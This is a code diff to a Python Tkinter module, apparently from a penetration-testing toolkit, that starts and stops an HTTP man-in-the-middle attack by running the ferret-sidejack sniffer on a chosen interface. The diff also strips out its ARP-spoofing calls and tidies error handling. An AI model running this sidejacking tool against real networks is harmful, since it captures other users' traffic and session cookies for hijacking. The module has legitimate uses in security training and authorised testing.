@@ -3,19 +3,18 @@ import traceback
 import subprocess
 import re
 import signal
-from Layer2Attacks.PageArpAttacks.funcFrameArp import *
 
 from tkinter import *
 
-def startHttpMitm(targetIp, targetDefaultGateway, interface, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#800800") :
+def startHttpMitm(interface, terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, colorConfig = "#252525") :
     global httpMitmIsRunning, httpMitmThreads, terminalLabel, wiresharkLabel, errorOutputLabel
 
     httpMitmIsRunning = False
-    httpMitmThreads = threading.Thread(target = lambda : executeHttpMitm(targetIp, targetDefaultGateway, interface))
+    httpMitmThreads = threading.Thread(target = lambda : executeHttpMitm(interface))
 
-    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#800800", font="bahnschrift 8", justify = "left", wraplength=480)
-    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#800800", font="bahnschrift 8", justify = "left", wraplength=480)
-    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#800800", font="bahnschrift 8", justify = "left", wraplength=480)
+    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
+    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
+    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
     terminalLabel.configure(bg = colorConfig) 
     wiresharkLabel.configure(bg = colorConfig)
     errorOutputLabel.configure(bg = colorConfig)
@@ -27,8 +26,8 @@ def startHttpMitm(targetIp, targetDefaultGateway, interface, terminalContentFram
     terminalLabel.pack(anchor = NW)
     errorOutputLabel.pack(anchor = NW)
 
-def stopHttpMitm(targetIp, targetDefaultGateway) :
-    global httpMitmThreads, httpMitmIsRunning
+def stopHttpMitm() :
+    global httpMitmThreads, httpMitmIsRunning, errorOutputLabel
 
     try:
         terminalLabel["text"] += "\n$ Stopping HTTP Man-In-The-Middle Attack...\n\n"
@@ -38,24 +37,22 @@ def stopHttpMitm(targetIp, targetDefaultGateway) :
 
         ferretMitmProcess.send_signal(signal.SIGINT)
         ferretMitmThread.join(0)
-        stopArp(targetIp, targetDefaultGateway)
 
         terminalLabel["text"] += "$ HTTP Man-In-The-Middle Attack successfully stopped!\n"
     except (AttributeError, RuntimeError):
         errorOutputLabel["text"] += traceback.format_exc()
     except Exception as e:
-        errorOutputLabel["text"] += "ERROR : \n" + e + "\n"
+        errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
 
 def runHttpMitm() :
     global httpMitmThreads, httpMitmIsRunning
     httpMitmIsRunning = True
     httpMitmThreads.start()
 
-def executeHttpMitm(targetIp, targetDefaultGateway, interface):
+def executeHttpMitm(interface):
     global ferretMitmProcess, ferretMitmThread
 
-    arpSpoofThread = threading.Thread(target = lambda : arpLoop(targetIp, targetDefaultGateway))
-    ferretMitmProcess = subprocess.Popen(["ferret", "-i", interface], 
+    ferretMitmProcess = subprocess.Popen(["ferret-sidejack", "-i", interface], 
                                          stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     ferretMitmThread = threading.Thread(target=reader, args=(ferretMitmProcess,))
     ferretMitmThread.start()
@@ -69,3 +66,6 @@ def reader(proc):
         if output:
             ansiStripOutput = ansi_escape.sub('', output)
             terminalLabel["text"] += "$ " + ansiStripOutput.strip() + "\n"
+
+def arpErrorHandling(error) :
+    errorOutputLabel["text"] += str(error) + "\n"
